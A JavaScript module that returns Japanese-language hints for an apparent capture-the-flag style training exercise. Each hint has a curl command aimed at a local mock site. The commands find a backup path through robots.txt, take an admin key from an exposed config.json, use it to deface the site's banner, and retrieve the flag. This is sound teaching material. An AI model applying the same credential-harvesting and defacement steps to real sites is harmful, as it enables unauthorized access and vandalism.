export function mockHints() {
  const base='http://mocksite:3200/vulnerable';
  const curl='curl -sS --max-time 10 -H "X-TerminalBox-Session: $TERMINALBOX_SESSION_ID"';
  return [
    {theme:'discover',title:'1. 公開ファイルの手がかりを見る',steps:[{text:'そのまま貼り付けてEnterを押します。Disallowに出るバックアップの場所を確認してください。',command:`${curl} ${base}/robots.txt; printf '\\n'`}]},
    {theme:'backup',title:'2. 管理APIと管理キーを取得する',steps:[{text:'そのまま実行してください。adminApiとadminKeyが表示されます。取得内容はファイルへ保存するので、キーの書き写しは不要です。',command:`${curl} ${base}/backup/config.json | tee "/tmp/terminalbox-mock-$TERMINALBOX_SESSION_ID.json"; printf '\\n'`}]},
    {theme:'deface',title:'3. 管理APIで模擬サイトの表示を変更する',steps:[{text:'そのまま実行してください。手順2で保存したキーを自動で読み取ります。updated:true が出たら成功です。模擬サイトの「再読み込み」を押すとタイトルの変更を確認できます。',command:`KEY=$(python3 -c 'import json, os; print(json.load(open("/tmp/terminalbox-mock-"+os.environ["TERMINALBOX_SESSION_ID"]+".json"))["adminKey"])') && ${curl} -X POST --data-urlencode "adminKey=$KEY" --data-urlencode 'title=学習用に表示を変更しました' ${base}/api/admin/banner; printf '\\n'`}]},
    {theme:'flag',title:'4. Flagを取得して回答する',steps:[{text:'TBX{…}が表示されます。その文字列を回答欄へ貼り付けて「回答」を押してください。',command:`${curl} ${base}/api/flag; printf '\\n'`}]},
  ];
}
